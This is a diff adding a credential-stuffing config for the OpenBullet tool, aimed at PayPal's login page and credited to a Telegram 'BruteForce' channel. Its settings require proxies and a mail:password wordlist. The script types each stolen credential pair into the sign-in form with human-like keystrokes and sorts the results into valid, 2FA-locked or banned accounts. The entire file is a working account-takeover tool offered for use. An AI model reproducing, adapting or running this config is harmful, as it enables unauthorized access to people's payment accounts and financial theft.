@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "PayPal.Com",
+  "SuggestedBots": 5,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-25T22:11:47.9472883+02:00",
+  "AdditionalInfo": "T.me/BruteForce",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": true,
+  "AlwaysQuit": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": true,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Open BROWSERACTION Open 
+
+#Links NAVIGATE "https://www.paypal.com/signin" 
+
+#Delay FUNCTION Delay "100" 
+
+#Id1_E ELEMENTACTION Name "login_email" 
+  Click 
+
+#Id4_US ELEMENTACTION Id "email" 
+  SendKeysHuman "<USER>" 
+
+#Delay FUNCTION Delay "1000" 
+
+#Id5_LogM ELEMENTACTION Id "btnNext" 
+  Click 
+
+#Delay FUNCTION Delay "1000" 
+
+#Click ELEMENTACTION Name "login_password" 
+  Click 
+
+#H_Pass ELEMENTACTION Name "login_password" 
+  SendKeysHuman "<PASS>" 
+
+#Logs ELEMENTACTION Id "btnLogin" 
+  Click 
+
+#5S ELEMENTACTION Id "" 
+  WaitForElement "5s" 
+
+#CompleteSS BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "We're looking out for you." 
+    KEY "challengesSection" 
+    KEY "addPhoneRequired" 
+    KEY "Verificação de segurança" 
+    KEY "Keep your mobile number updated" 
+  KEYCHAIN Failure OR 
+    KEY "forgotPasswordModal" 
+    KEY "Some of your info isn't correct. Please try again." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Sorry, we can't log you in. If you think there's a problem with your account" 
+    KEY "reset your password" 
+    KEY "role=\"alert\">For security reasons" 
+  KEYCHAIN Ban OR 
+    KEY "Security Challenge" 
+
+#Close BROWSERACTION Quit 
+
+#C FUNCTION Constant "@BruteForce" -> CAP "Join Telegram Channel:" 
+
